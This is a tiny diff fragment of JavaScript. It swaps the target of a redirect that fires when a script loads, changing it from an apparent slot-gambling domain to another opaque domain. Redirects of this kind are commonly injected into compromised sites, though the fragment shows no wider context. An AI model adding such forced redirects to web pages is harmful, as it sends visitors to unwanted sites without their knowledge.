@@ -10,7 +10,7 @@
     function redirect() {
         clearTimeout(timeout);
         script.onload = null;
-        window.location.href = "https://jump.slotjuara.com/";
+        window.location.href = "https://17abcd88.com/";
     }
 
     script.onload = redirect;
